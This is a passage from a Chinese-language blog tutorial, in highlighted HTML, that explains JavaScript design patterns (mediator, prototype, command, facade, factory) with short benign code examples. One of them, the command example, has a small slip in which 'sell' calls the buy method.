punctuation">(</span><span class="token string">'Channel not exist!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">const</span> publisher <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Publisher</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 用户订阅频道</span><span class="token comment">// 用户 1</span>publisher<span class="token punctuation">.</span><span class="token function">subscribe</span><span class="token punctuation">(</span><span class="token string">'Game'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">data</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 用户 2</span>publisher<span class="token punctuation">.</span><span class="token function">subscribe</span><span class="token punctuation">(</span><span class="token string">'Music'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">data</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 发布订阅</span>publisher<span class="token punctuation">.</span><span class="token function">publish</span><span class="token punctuation">(</span><span class="token string">'Music'</span><span class="token punctuation">,</span> <span class="token string">'Add a new music.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// Add a new music. （用户 2 收到消息）</span>publisher<span class="token punctuation">.</span><span class="token function">publish</span><span class="token punctuation">(</span><span class="token string">'Game'</span><span class="token punctuation">,</span> <span class="token string">'Add a new game.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// Add a new game. （用户 1 收到消息）</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="中介者模式"><a href="#中介者模式" class="headerlink" title="中介者模式"></a>中介者模式</h2><p>中介者模式（Mediator Pattern），中介者的定义是，一个在谈判或冲突解决过程中起辅助作用的<strong>中立方</strong>，如生活中的房屋中介，可以减少普通用户购房过程的一些繁杂操作；机场的航站塔，接受总部指令，控制具体那些飞机可以起飞、降落；软件中的中介者用于减少组件间的大量直接通信，转而通过某个中心点来控制，可以实现<strong>松耦合</strong>，同时提高其复用性；</p><p>尝试实现一个简单的聊天室，不同用户发送消息，中介者（消息处理器）统一处理信息（如显示在公屏上）；</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// 定义用户及其行为</span><span class="token keyword">class</span> <span class="token class-name">User</span> <span class="token punctuation">&#123;</span>    <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token parameter">name</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">sendMessage</span><span class="token punctuation">(</span><span class="token parameter">msg<span class="token punctuation">,</span> to</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        MessageMediator<span class="token punctuation">.</span><span class="token function">sendMessage</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>name<span class="token punctuation">,</span> msg<span class="token punctuation">,</span> to<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">// 聊天室</span><span class="token keyword">class</span> <span class="token class-name">ChatRoom</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// 模拟在公屏上展示消息</span>    <span class="token keyword">static</span> <span class="token function">showMessage</span><span class="token punctuation">(</span><span class="token parameter">msg</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>msg<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">// 消息处理器</span><span class="token keyword">class</span> <span class="token class-name">MessageMediator</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// 统一处理不同用户发送的消息</span>    <span class="token keyword">static</span> <span class="token function">sendMessage</span><span class="token punctuation">(</span><span class="token parameter">user<span class="token punctuation">,</span> msg<span class="token punctuation">,</span> to</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">let</span> toUser <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>to<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            toUser <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">@</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>to<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">;</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        ChatRoom<span class="token punctuation">.</span><span class="token function">showMessage</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">[</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>user<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">]: </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>toUser<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string"> </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>msg<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">const</span> jack <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token string">'Jack'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> bob <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token string">'Bob'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 模拟发送消息</span>jack<span class="token punctuation">.</span><span class="token function">sendMessage</span><span class="token punctuation">(</span><span class="token string">'Hello everyone!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// [Jack]: Hello everyone!</span>bob<span class="token punctuation">.</span><span class="token function">sendMessage</span><span class="token punctuation">(</span><span class="token string">'Welcome! Jack.'</span><span class="token punctuation">,</span> <span class="token string">'Jack'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// [Bob]: @Jack; Welcome! Jack.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>咋一看是一个简单的功能用了大量代码来实现，但是当用户量相当大，逻辑更复杂时，就能较好的把用户与聊天室的联系松开，通过中间件处理两边的复杂逻辑并做好二者的衔接工作，实现一个中介的价值；</p><h2 id="原型模式"><a href="#原型模式" class="headerlink" title="原型模式"></a>原型模式</h2><p>原型模式（Prototype Pattern）核心为<strong>继承</strong>，即能够基于一个对象或类为模板，创建另一个对象或类，使新对象与原型对象拥有一些共同属性或方法；该模式创建重复对象，可以一定程度上提升性能；</p><p>JavaScript 中基于一个对象为原型创建另一个对象常用的方法是 <code>Object.create()</code>，方法第一个参数是原型（prototype）对象，第二个参数是新建对象的一些属性描述：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> protoObj <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token literal-property property">a</span><span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span>    <span class="token function-variable function">getA</span><span class="token operator">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>a<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">const</span> newObj <span class="token operator">=</span> Object<span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span>protoObj<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>    <span class="token literal-property property">b</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>        <span class="token literal-property property">value</span><span class="token operator">:</span> <span class="token number">2</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token literal-property property">getB</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>        <span class="token function-variable function">value</span><span class="token operator">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>b<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>newObj<span class="token punctuation">.</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 1</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>newObj<span class="token punctuation">.</span><span class="token function">getA</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 1</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>newObj<span class="token punctuation">.</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 2</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>newObj<span class="token punctuation">.</span><span class="token function">getB</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 2</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>newObj<span class="token punctuation">.</span>__proto__<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// &#123; a: 1, getA: f () &#125;</span>protoObj<span class="token punctuation">.</span>a <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>newObj<span class="token punctuation">.</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 3</span>newObj<span class="token punctuation">.</span>a <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>protoObj<span class="token punctuation">.</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 3</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>或者模拟一下实现：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">createObj</span><span class="token punctuation">(</span><span class="token parameter">proto<span class="token punctuation">,</span> obj</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">function</span> <span class="token constant">F</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token class-name">F</span><span class="token punctuation">.</span>prototype <span class="token operator">=</span> proto<span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">F</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">const</span> protoObj <span class="token operator">=</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">a</span><span class="token operator">:</span> <span class="token number">1</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">const</span> newObj <span class="token operator">=</span> <span class="token function">createObj</span><span class="token punctuation">(</span>protoObj<span class="token punctuation">)</span><span class="token punctuation">;</span>newObj<span class="token punctuation">.</span>b <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>newObj<span class="token punctuation">.</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 1</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>newObj<span class="token punctuation">.</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 2</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>newObj<span class="token punctuation">.</span>__proto__<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// &#123; a: 1 &#125;</span>protoObj<span class="token punctuation">.</span>a <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>newObj<span class="token punctuation">.</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 3</span>newObj<span class="token punctuation">.</span>a <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>protoObj<span class="token punctuation">.</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 3</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>以上例子最后的执行结果都表明，新建对象的原型是对原型对象的一个引用，并且是<strong>单向引用</strong>，即原型对象会影响新对象，新对象无法影响到原型对象，这就可以在实现克隆或继承对象的功能时，减少内存的开销，提升性能；</p><p>类的原型继承就比较简单了：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">class</span> <span class="token class-name">A</span> <span class="token punctuation">&#123;</span>    a <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">B</span> <span class="token keyword">extends</span> <span class="token class-name">A</span> <span class="token punctuation">&#123;</span>    b <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">const</span> b <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">B</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// &#123; a: 1, b: 2 &#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>由于 JavaScript 不像 Java 一样有类的机制，所以上述写法也只是 ES6 的新特性，方便书写代码，底层实现和 <code>Object.create()</code> 相差无几；</p><h2 id="命令模式"><a href="#命令模式" class="headerlink" title="命令模式"></a>命令模式</h2><p>命令模式（Command Pattern）是将一系列方法封装在一个对象中，对方法的调用请求以命令的形式传递给这个对象，然后由该对象来寻找处理该命令的合适方法；是一种数据驱动的模式；将方法的实现与调用解耦，并实现方法调用的参数化，能便于后期的逻辑调整；</p><p>考虑下面一种购买商品的简单场景：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> itemObj <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token function-variable function">buy</span><span class="token operator">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">item</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'You have bought the '</span> <span class="token operator">+</span> item<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token function-variable function">sell</span><span class="token operator">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">item</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'You have sold the '</span> <span class="token operator">+</span> item<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>itemObj<span class="token punctuation">.</span><span class="token function">buy</span><span class="token punctuation">(</span><span class="token string">'phone'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// You have bought the phone</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这样 <code>itemObj</code> 既是内部方法的声明者也是调用者，如果后期一些内部方法的逻辑调整，比如方法名或传参，那么后面所有调用这些方法的地方都得要改一遍，这种强耦合对于开发是很不利的，所以需要实现一个方法，专门用于接受一些调用命令，再自行去对应地调用合适的方法执行逻辑；比如：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> itemObj <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token function-variable function">buy</span><span class="token operator">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">item</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'You have bought the '</span> <span class="token operator">+</span> item<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token function-variable function">sell</span><span class="token operator">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">item</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'You have sold the '</span> <span class="token operator">+</span> item<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token function-variable function">execute</span><span class="token operator">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">command<span class="token punctuation">,</span> content</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">switch</span> <span class="token punctuation">(</span>command<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">case</span> <span class="token string">'buy'</span><span class="token operator">:</span>                <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">buy</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">case</span> <span class="token string">'sell'</span><span class="token operator">:</span>                <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">buy</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">default</span><span class="token operator">:</span>                <span class="token keyword">return</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>itemObj<span class="token punctuation">.</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token string">'buy'</span><span class="token punctuation">,</span> <span class="token string">'phone'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// You have bought the phone</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这种对方法或属性进行实现与调用的松耦合操作，有些类似一些面向对象语言中的<strong>抽象类(abstract class)**和</strong>接口(interface)**特性，即将实现与调用分离;</p><h2 id="外观模式"><a href="#外观模式" class="headerlink" title="外观模式"></a>外观模式</h2><p>外观模式（Facade Pattern），概括就是隐藏系统的复杂性，对外封装提供一个更易于使用和访问的接口；所谓外观便是，好看好用就行，管它内部经络骨骼有多复杂和不堪，比如 <code>JQuery</code>，能曾经一度流行也和其对一些方法和兼容性处理逻辑的封装有着很大关系，比如 <code>$()</code> 可直接进行多种类型的元素选择，不用再去写冗长的 <code>getElementById()</code> 或者 <code>getElementsByClassName()</code> 等方法；</p><p>比如要实现一个简单的字符串转十六进制码的方法，可以这样封装：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">class</span> <span class="token class-name">StringConvertor</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">static</span> <span class="token function">toHex</span><span class="token punctuation">(</span><span class="token parameter">str</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">const</span> strArr <span class="token operator">=</span> str<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">const</span> hexArr <span class="token operator">=</span> strArr<span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token parameter">char</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> char<span class="token punctuation">.</span><span class="token function">charCodeAt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">return</span> hexArr<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">const</span> hex <span class="token operator">=</span> StringConvertor<span class="token punctuation">.</span><span class="token function">toHex</span><span class="token punctuation">(</span><span class="token string">'Hello world!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>hex<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// "48656c6c6f20776f726c6421"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>当然使用这种模式也需要考虑性能等因素，需要权衡实现需求与性能消耗之间，是否值得加上并使用这一层抽象逻辑，否则这种外观就成了“花瓶”，中看不中用；比如使用但从速度上说，<code>$(&#39;#id&#39;)</code> 是肯定比不上 <code>getElementById(&#39;id&#39;)</code> 的，当然为了整体的使用体验愿意牺牲这些性能也可以完全忽略；而对于一些复杂逻辑的实现，难以找到更好的替代选项，那么提供这一层封装多方面来讲都是有益的；</p><h2 id="工厂模式"><a href="#工厂模式" class="headerlink" title="工厂模式"></a>工厂模式</h2><p>工厂模式（Factory Pattern），提供了一种对象的创建方式，一个工厂能提供一个公共接口用于对象创建，接口内部封装好对象的创建逻辑而不会暴露出来，通常用于逻辑复杂的对象生成场景，如根据输入获得不同类型的对象；</p><p>例如一个简单的生产汽车的工厂示例：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// 生产 A 类汽车的类</span><span class="token keyword">class</span> <span class="token class-name">CarA</span> <span class="token punctuation">&#123;</span>    <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token parameter">option</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>carAttr <span class="token operator">=</span> option<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">getCarAttr</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>carAttr<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">// 生产 B 类汽车的类</span><span class="token keyword">class</span> <span class="token class-name">CarB</span> <span class="token punctuation">&#123;</span>    <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token parameter">option</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>carAttr <span class="token operator">=</span> option<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">getCarAttr</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>carAttr<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">// 生产不同汽车的工厂类</span><span class="token keyword">class</span> <span class="token class-name">CarFactory</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">static</span> <span class="token function">createCar</span><span class="token punctuation">(</span><span class="token parameter">option</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">const</span> <span class="token punctuation">&#123;</span> type<span class="token punctuation">,</span> name<span class="token punctuation">,</span> color <span class="token punctuation">&#125;</span> <span class="token operator">=</span> option<span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>type <span class="token operator">===</span> <span class="token string">'A'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">CarA</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> name<span class="token punctuation">,</span> color <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>type <span class="token operator">===</span> <span class="token string">'B'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">CarB</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> name<span class="token punctuation">,</span> color <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">const</span> car1 <span class="token operator">=</span> CarFactory<span class="token punctuation">.</span><span class="token function">createCar</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>    <span class="token literal-property property">type</span><span class="token operator">:</span> <span class="token string">'A'</span><span class="token punctuation">,</span>    <span class="token literal-property property">name</span><span class="token operator">:</span> <span class="token string">'car1'</span><span class="token punctuation">,</span>    <span class="token literal-property property">color</span><span class="token operator">:</span> <span class="token string">'red'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> car2 <span class="token operator">=</span> CarFactory<span class="token punctuation">.</span><span class="token function">createCar</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>    <span class="token literal-property property">type</span><span class="token operator">:</span> <span class="token string">'B'</span><span class="token punctuation">,</span>    <span class="token literal-property property">name</span><span class="token operator">:</span> <span class="token string">'car2'</span><span class="token punctuation">,</span>    <span class="token literal-property property">color</span><span class="token operator">:</span> <span class="token string">'black'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> car1Attr <span class="token operator">=</span> car1<span class="token punctuation">.</span><span class="token function">getCarAttr</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> car2Attr <span class="token operator">=</span> car2<span class="token punctuation">.</span><span class="token function">getCarAttr</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>car1Attr<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// &#123;name: "car1", color: "red"&#125;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>car2Attr<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// &#123;name: "car2", color: "black"&#125;</span><span aria-hidden="true" 